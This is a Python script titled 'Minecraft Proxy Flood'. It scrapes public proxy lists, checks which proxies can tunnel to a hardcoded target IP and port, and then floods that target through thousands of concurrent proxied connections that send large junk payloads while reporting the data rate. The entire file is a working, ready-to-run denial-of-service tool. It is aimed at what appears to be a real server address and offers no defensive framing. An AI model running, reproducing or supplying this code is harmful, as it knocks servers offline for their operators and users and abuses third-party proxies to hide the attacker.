"""
Minecraft Proxy Flood
"""
import socket, time, sys, asyncio, urllib.request, re, os, random
from colorama import init, Fore
init(autoreset=True)

PROXY_SOURCES = [
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
    "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
    "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
    "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all",
]

TARGET_IP = "5.133.100.33"
TARGET_PORT = 25600
TASK_COUNT = 10000
TEST_DURATION = 30
PAYLOAD_SIZE = 65500
PAYLOAD = b'x' * PAYLOAD_SIZE

bytes_sent = connections = errors = 0
lock = asyncio.Lock()
VALID_PROXIES = []

def scrape_proxies():
    proxies = []
    for i, url in enumerate(PROXY_SOURCES):
        try:
            req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
            data = urllib.request.urlopen(req, timeout=15).read().decode()
            found = re.findall(r'(\d+\.\d+\.\d+\.\d+):(\d+)', data)
            proxies.extend([f"{ip}:{port}" for ip, port in found])
            print(f"[SCRAPE] {i+1}/{len(PROXY_SOURCES)} {len(found)} from {url.split('/')[2]}", flush=True)
        except Exception as e:
            print(f"[SCRAPE] {i+1}/{len(PROXY_SOURCES)} FAIL {url.split('/')[2]}: {e}", flush=True)
    proxies = list(set(proxies))
    print(f"[SCRAPE] Total unique: {len(proxies)}", flush=True)
    return proxies

async def check_proxy(proxy_str, target_ip, target_port, timeout=3):
    try:
        ip, port = proxy_str.split(":")
        s = socket.socket()
        s.settimeout(timeout)
        s.connect((ip, int(port)))
        s.send(f"CONNECT {target_ip}:{target_port} HTTP/1.1\r\nHost: {target_ip}:{target_port}\r\n\r\n".encode())
        resp = s.recv(256)
        s.close()
        return proxy_str if resp.startswith(b"HTTP/1.1 200") else None
    except:
        return None

async def check_all_proxies(proxies, target_ip, target_port):
    valid = []; total = len(proxies); checked = 0; start = time.time()
    sem = asyncio.Semaphore(100)

    async def check_one(p):
        nonlocal checked
        async with sem:
            ok = await check_proxy(p, target_ip, target_port)
        checked += 1
        if checked % 25 == 0 or checked == total:
            e = time.time()-start; pct=checked/total*100; rate=checked/max(e,0.1)
            eta=(total-checked)/max(rate,1)
            bar="█"*int(pct//5)+"░"*(20-int(pct//5))
            print(f"\r[CHECK] |{bar}| {pct:.0f}% {len(valid)}v {checked}/{total} {rate:.0f}/s ETA{eta:.0f}s", end="", flush=True)
        return ok

    print(f"[CHECK] {total} proxies, 100 concurrent...", flush=True)
    tasks = [asyncio.create_task(check_one(p)) for p in proxies]
    results = await asyncio.gather(*tasks)
    for r in results:
        if r: valid.append(r)
    print()
    return valid

async def flood_proxy(stop, proxy_list):
    global bytes_sent, connections, errors
    loop = asyncio.get_running_loop()
    while not stop.is_set():
        if not proxy_list:
            await asyncio.sleep(0.1)
            continue
        proxy_str = random.choice(proxy_list)
        try:
            p_ip, p_port = proxy_str.split(":")
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.settimeout(5.0)
            s.setblocking(False)
            await asyncio.wait_for(loop.sock_connect(s, (p_ip, int(p_port))), timeout=3.0)
            req = f"CONNECT {TARGET_IP}:{TARGET_PORT} HTTP/1.1\r\nHost: {TARGET_IP}:{TARGET_PORT}\r\n\r\n"
            await asyncio.wait_for(loop.sock_sendall(s, req.encode()), timeout=3.0)
            resp = b""
            while b"\r\n\r\n" not in resp:
                chunk = await asyncio.wait_for(loop.sock_recv(s, 1024), timeout=3.0)
                resp += chunk
            if b"200" not in resp:
                raise Exception("proxy rejected")
            async with lock:
                connections += 1
            while not stop.is_set():
                try:
                    await asyncio.wait_for(loop.sock_sendall(s, PAYLOAD), timeout=2.0)
                    async with lock:
                        bytes_sent += len(PAYLOAD)
                except:
                    break
        except:
            async with lock:
                errors += 1
        finally:
            try: s.close()
            except: pass

async def monitor(stop, start, tasks):
    while not stop.is_set():
        await asyncio.sleep(0.5)
        elapsed = time.time() - start
        if elapsed >= TEST_DURATION:
            stop.set(); break
        async with lock:
            b = bytes_sent; c = connections; e = errors
        mbps = (b/max(elapsed,0.1))*8/1_000_000
        er = e/max(c+e,1)*100
        alive = sum(1 for t in tasks if not t.done())
        print(f"\r[T{elapsed:.0f}s] DATA:{b/1_000_000:.1f}MB RATE:{mbps:.0f}Mbps "
              f"CONN:{c} ERR:{e}({er:.1f}%) TASKS:{alive} PROXIES:{len(VALID_PROXIES)}", end="", flush=True)

async def main_async():
    global TASK_COUNT, TEST_DURATION, TARGET_IP, TARGET_PORT, VALID_PROXIES

    if len(sys.argv) >= 3:
        TARGET_IP = sys.argv[1]; TARGET_PORT = int(sys.argv[2])
    if len(sys.argv) >= 4:
        TASK_COUNT = int(sys.argv[3])
    if len(sys.argv) >= 5:
        TEST_DURATION = int(sys.argv[4])

    print(f"[FLOOD] {TASK_COUNT}tasks x{PAYLOAD_SIZE}B -> {TARGET_IP}:{TARGET_PORT} {TEST_DURATION}s", flush=True)
    print("[1/3] Scraping proxies...", flush=True)
    proxies = scrape_proxies()
    if not proxies:
        print("[FAIL] No proxies scraped", flush=True); return

    print("[2/3] Checking proxies against target...", flush=True)
    VALID_PROXIES = await check_all_proxies(proxies, TARGET_IP, TARGET_PORT)
    if not VALID_PROXIES:
        print("[FAIL] No working proxies found", flush=True); return
    print(f"[OK] {len(VALID_PROXIES)} working proxies", flush=True)

    print("[3/3] Starting flood...", flush=True)
    stop = asyncio.Event()
    tasks = [asyncio.create_task(flood_proxy(stop, VALID_PROXIES)) for _ in range(TASK_COUNT)]
    start = time.time()
    mon = asyncio.create_task(monitor(stop, start, tasks))
    await asyncio.gather(*tasks, return_exceptions=True)
    await mon

    elapsed = time.time()-start
    async with lock:
        b=bytes_sent; c=connections; e=errors
    mbps = (b/max(elapsed,0.1))*8/1_000_000
    er = e/max(c+e,1)*100
    print(f"\n[DATA] {b/1_000_000:.1f}MB | {mbps:.0f}Mbps | CONN:{c} | ERR:{e}({er:.1f}%)")

def main():
    try: asyncio.run(main_async())
    except KeyboardInterrupt: print("\n[STOP]")
    except Exception as ex: print(f"\n[ERR] {ex}")

if __name__ == "__main__":
    main()
